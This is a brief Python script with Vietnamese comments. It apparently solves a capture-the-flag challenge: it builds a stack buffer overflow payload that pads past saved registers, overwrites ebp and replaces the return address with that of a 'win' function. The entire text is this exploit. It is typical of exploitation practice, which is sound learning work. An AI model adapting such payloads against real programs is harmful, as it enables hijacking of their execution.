
buffer = "a" * 64  + "a" * 8 #ebx + ecx
ebp = "\x77" * 4    # ghi đè ebp
eip = "\x76\x91\x04\x08"        # địa chỉ hàm win

payload = buffer + ebp + eip
print(payload)